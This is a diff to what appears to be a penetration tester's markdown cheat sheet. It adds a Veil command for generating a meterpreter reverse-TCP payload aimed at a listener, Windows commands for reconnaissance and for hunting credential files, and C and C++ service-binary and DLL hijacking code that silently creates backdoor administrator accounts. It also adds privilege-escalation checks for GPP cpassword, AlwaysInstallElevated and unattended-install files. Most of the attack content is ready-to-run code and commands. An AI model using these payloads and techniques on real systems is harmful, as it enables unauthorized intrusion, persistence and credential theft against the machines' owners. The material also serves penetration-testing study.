@@ -488,6 +488,20 @@ sudo apt-get update && apt-get install wine32
 </details>
 
 <details>
+<summary> veil </summary>
+
+``` bash
+# use veil to produce payloads, configurable with metasploit
+veil 
+use evasion 
+use powershell/meterpreter/rev_tcp
+set lhost 192.168.1.1
+set lport 443
+generate
+```
+</details>
+
+<details>
 <summary> Powershell Memory Injection </summary>
 
 A basic templated script that performs in-memory injection is shown in the listing below. The script starts by importing VirtualAlloc and CreateThread from kernel32.dll as well as memset from msvcrt.dll. These functions will allow us to allocate memory, create an execution thread, and write arbitrary data to the allocated memory, respectively. We will allocate the memory and execute a new thread in the current process (powershell.exe), rather than a remote one.
@@ -645,6 +659,18 @@ https://github.com/klezVirus/chameleon
 
 
 ## Situational Awareness
+
+There are several key pieces of information we should always obtain:
+
+- Username and hostname
+- Group memberships of the current user
+- Existing users and groups
+- Operating system, version and architecture
+- Network information
+- Installed applications
+- Running processes
+
+
 <details>
 <summary> linux </summary>
 
@@ -670,11 +696,31 @@ find /home -name authorized_hosts -perm 2 2>dev/null
 <summary> windows </summary>
 
 ``` bat
+rem misc commands for situational awareness
+systeminfo
+ipconfig /all
+route print 
+netstat -ano
+Get-Process
+
+rem see powershell history
+Get-History
+
+rem find the logged powershell history from PSReadline
+(Get-PSReadlineOption).HistorySavePath
+
+rem see what groups your user is a member of. Builtin grpuops of note are Backup Operators (can create backup of all files on system), Remote Desktop Users (can RDP to the machine), and Remote Management Users (can access system with WinRM)
+whoami /groups
+
+rem check for SeImpersonatePrivilege enabled for priv esc
+whoami /priv
+
 rem show DNS details
 ipconfig /displaydns
 
 rem show all user accounts (local or domain)
 net user
+Get-LocalUser
 net1.exe user
 net user /domain
 
@@ -684,10 +730,12 @@ net user [username] /domain
 
 rem list all groups (local or domain)
 net localgroup
+Get-LocalGroup
 net group /domain
 
 rem show membership of a specific group (local or domain)
 net localgroup "groupname"
+Get-LocalGroupMember "groupname"
 net group "groupname" /domain
 net group "Domain Admins" /domain
 
@@ -704,10 +752,19 @@ net localgroup administrators [username] /add
 rem show accounts with a bad password login count > 0
 Get-ADObject -Filter 'badPwdCount -gt 0' -Server domain.com
 
+rem check for windows credential guard
+Get-ComputerInfo
+
 rem show firewall settings
 netsh firewall show state
 netsh firewall show config
 netsh advfirewall show allprofiles state
+
+rem show all installed appilcations (32 bit)
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+rem show all installed appilcations (64 bit)
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
 
 rem show scheduled tasks
 schtasks /query /fo LIST /v
@@ -720,6 +777,9 @@ dir /s *name*
 
 rem find secrets recursiveley
 dir /s *pass* == *cred* == *vnc* == *.config*
+
+rem look for user files containing potentially sensitive information
+Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 
 rem query for SPNs
 setspn.exe -T * -Q */*
@@ -969,42 +1029,181 @@ reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "AppUpdateMon" /
 ```
 
 
-## Privelege Escalation
-<details>
-<summary> linux </summary>
+## Privilege Escalation
 
-1. [gtfobins](https://gtfobins.github.io/)
-2. [linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
-3. cheatsheets. [here is a good one](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
+<details>
+<summary><b>Linux</b></summary>
+
+1. [GTFOBins](https://gtfobins.github.io/)  
+2. [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)  
+3. Cheatsheets: [here is a good one](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
 
 </details>
 
 <details>
-<summary> windows </summary>
+<summary><b>Windows</b></summary>
 
-1. [LOLBAS](https://lolbas-project.github.io/#)
-3. UAC Bypass (https://github.com/hfiref0x/UACME)
-2. Unquoted Service Paths
+<div style="margin-left:20px">
+
+<details>
+<summary>LOLBAS</summary>
+<a href="https://lolbas-project.github.io/#">https://lolbas-project.github.io/#</a>
+</details>
+
+<details>
+<summary>UAC Bypass</summary>
+<a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a>
+</details>
+
+<details>
+<summary> Automated Checks </summary>
+
+1. winpeas (https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
+2. powerup.ps1 (https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
+3. seatbelt (https://github.com/GhostPack/Seatbelt)
+
+</details>
+
+<details>
+<summary>scheduled tasks</summary>
+
+this is simmilar to service binary hijacking. If you have the proper permissions on an executable for a scheduled task, you can hijack it and its permissions. 
+
+``` bat
+rem query scheduled tasks, look for non-system tasks
+schtasks /query /fo LIST /v
+```
+</details>
+
+<details>
+<summary> Unquoted Service Paths </summary>
+
+an unquoted service path search might look like this 
+1. C:\Program.exe
+2. C:\Program Files\Enterprise.exe
+3. C:\Program Files\Enterprise Apps\Current.exe
+4. C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+
 ``` bat
 rem find unquoted service paths
 wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+rem List of services with binary path
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName
 ```
-3. services whose files you can overwrite
-3. DLL search order hijacking
-3. [winpeas](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)
-4. group policy preferences file. msft publishes the [AES key](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)
+if you can find a service path which you have the proper permissions to write to, you can add a malicious binary with the proper name in order to hijack service execution. 
+
+</details>
+
+<details>
+<summary> Service Binary Hijacking </summary>
+overwrite a service executable with our own
+
+``` bat
+rem List services with binary path
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+rem check permissioms of a service binary
+icacls "C:\xampp\mysql\bin\mysqld.exe"
+```
+next, create a new binary on the attacker machine as `service.c`. You can also use msfvenom or other payload providers. 
+``` c
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+```
+now, we can cross compile it and put it on the victim machine and restart the service. 
+
+``` bash
+x86_64-w64-mingw32-gcc service.c -o service.exe
+```
+</details>
+
+<details>
+<summary> DLL search order hijacking </summary>
+
+The following listing shows the standard search order taken from Microsoft Documentation:
+1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+
+If you can identify a program that is missing a dll, or you find that you can insert one higher up in the order, you could force the application to attach to your malicious dll. 
+
+Procmon will be useful to identify program missing dll's.
+
+On your attacker machine, cross compile a malicious dll as `mal.cpp`
+
+``` cpp
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave3 password123! /add");
+  	    i = system ("net localgroup administrators dave3 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+now, cross compile
+``` bash
+x86_64-w64-mingw32-gcc mal.cpp --shared -o SharedLib.dll
+```
+
+</details>
+
+<details>
+<summary> group policy preferences file </summary>
+
+msft publishes the [AES key](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)
 ``` powershell
 # find cpassword under the sysvol share in any xml file
 Get-ChildItem -Path "$env:LOGONSERVER\sysvol" -Filter *.xml -Recurse | Select-String "cpassword"
 ```
-7. Recovering Credentials from a PXE Boot Image
-8. always install elevated registry setting
+</details>
+
+<details>
+<summary>Recovering Credentials from a PXE Boot Image</summary>
+</details>
+
+<details>
+<summary>always install elevated registry setting </summary>
+
 ``` bat
 rem This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 ```
-9. unattended install files
+</details>
+
+<details>
+<summary> unattended install files</summary>
+
 ``` powershell
 # unattended install files typically in these locations
 c:\sysprep.inf
@@ -1015,9 +1214,23 @@ c:\windows\system32sysprep\Unattended.xml
 %WINDIR%\Panther\Unattend\Unattended.xml
 %WINDIR%\Panther\Unattended.xml
 ```
-10. if administrator, escalate to SYSTEM
+</details>
+
+</details>
+<summary>Exploits</summary>
+
+privileges that may lead to privilege escalation are SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug and SeImpersonatePrivilege.
+
+check for kernel vulns from microsoft https://msrc.microsoft.com/update-guide
+
 ``` bat
-psexec.exe -s cmd.exe
+rem look for user privileges 
+whoami /priv
+whoami /all
+
+rem get system info and patch info 
+systeminfo
+Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
 ```
 </details>
 
